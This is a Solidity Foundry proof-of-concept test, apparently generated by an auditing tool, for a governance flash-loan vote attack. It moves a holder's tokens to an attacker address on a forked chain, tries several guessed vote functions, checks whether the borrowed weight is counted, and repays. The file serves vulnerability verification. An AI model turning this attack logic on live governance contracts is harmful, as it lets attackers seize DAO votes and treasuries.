// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Governance Flash Loan Vote
/// @notice Detector: centralization. Governance voting power is tied directly
///         to token balance at the time of vote, allowing an attacker to flash
///         loan enough tokens to pass a malicious governance proposal in a single
///         transaction.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set WHALE to a governance-token holder
///      on this fork, and the proposal id.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: a governance-token holder on this fork who can stand in as the
    // lender for the flash loan.
    address public constant WHALE = address(0);
    // TODO: an open proposal id on the target.
    uint256 public constant PROPOSAL = 1;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// The proposal's recorded FOR weight — the OBSERVABLE. The reader is a
    /// guess too, and a single wrong name reads as "not reproduced".
    function _forVotes(uint256 id) internal view returns (bool found, uint256 v) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("proposalForVotes(uint256)", id));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("getVotes(uint256)", id));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("proposals(uint256)", id));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        return (false, 0);
    }

    /// The caller's voting power — also a guess, and often the whole bug.
    function _votingPower(address who) internal view returns (bool found, uint256 v) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("getVotes(address)", who));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("getCurrentVotes(address)", who));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        return (false, 0);
    }

    /// One vote attempt. Success is the proposal's FOR WEIGHT GROWING by the
    /// transient balance — the vote counting tokens the caller did not own —
    /// never the call returning.
    function _voteOnce(address voter, uint256 id, uint256 borrowed, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        (bool found, uint256 before) = _forVotes(id);
        if (!found) return "";
        vm.prank(voter);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (!ok) return "";
        (bool found2, uint256 after_) = _forVotes(id);
        if (!found2) return "";
        return after_ >= before + borrowed && borrowed > 0 ? label : "";
    }

    function test_exploit() public {
        require(WHALE != address(0), "set WHALE to a governance-token holder on this fork");

        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        (bool powerFound, uint256 borrowed) = _votingPower(WHALE);
        require(
            powerFound && borrowed > 0,
            "no voting-power reader worked (tried balanceOf(address), getVotes(address), getCurrentVotes(address)), or the lender holds nothing. This does NOT establish safety."
        );
        (bool votesFound,) = _forVotes(PROPOSAL);
        require(
            votesFound,
            "no for-votes reader worked (tried proposalForVotes(uint256), getVotes(uint256), proposals(uint256)), so the vote cannot be observed. This does NOT establish safety."
        );

        // The loan: the tokens exist for the attacker only inside this
        // transaction, and are repaid at the end of it. A target that counts a
        // SPOT balance will count them; a target that checkpoints at a snapshot
        // will not, which is the correct "not reproduced".
        vm.prank(WHALE);
        (bool lent,) = target.call(
            abi.encodeWithSignature("transfer(address,uint256)", attackerEOA, borrowed)
        );
        require(
            lent,
            "the lender could not hand over governance tokens. Tried transfer(address,uint256). This does NOT establish safety: set WHALE to a holder that can, or the governance token may be a separate contract."
        );

        // The vote shape is a GUESS on an unverified target.
        string memory used;
        used = _voteOnce(attackerEOA, PROPOSAL, borrowed, "vote(uint256,bool)", abi.encodeWithSignature("vote(uint256,bool)", PROPOSAL, true));
        if (bytes(used).length == 0) {
            used = _voteOnce(attackerEOA, PROPOSAL, borrowed, "castVote(uint256,uint8)", abi.encodeWithSignature("castVote(uint256,uint8)", PROPOSAL, uint8(1)));
        }
        if (bytes(used).length == 0) {
            used = _voteOnce(attackerEOA, PROPOSAL, borrowed, "vote(uint256,uint8)", abi.encodeWithSignature("vote(uint256,uint8)", PROPOSAL, uint8(1)));
        }
        if (bytes(used).length == 0) {
            used = _voteOnce(attackerEOA, PROPOSAL, borrowed, "submitVote(uint256,bool)", abi.encodeWithSignature("submitVote(uint256,bool)", PROPOSAL, true));
        }
        if (bytes(used).length == 0) {
            used = _voteOnce(attackerEOA, PROPOSAL, borrowed, "voteOnProposal(uint256,bool)", abi.encodeWithSignature("voteOnProposal(uint256,bool)", PROPOSAL, true));
        }

        // Repay the loan in the same transaction: the weight was never owned.
        vm.prank(attackerEOA);
        (bool repaid,) = target.call(
            abi.encodeWithSignature("transfer(address,uint256)", WHALE, borrowed)
        );
        console.log("loan repaid in the same transaction:", repaid);

        console.log("vote entry point that counted transient weight:", used);
        assertTrue(
            bytes(used).length > 0,
            "no vote entry point counted a transient balance. Tried vote(uint256,bool), castVote(uint256,uint8), vote(uint256,uint8), submitVote(uint256,bool), voteOnProposal(uint256,bool). This does NOT establish safety: voting power may be checkpointed at a snapshot, the vote may be named differently, or the proposal id may be wrong."
        );
    }
}
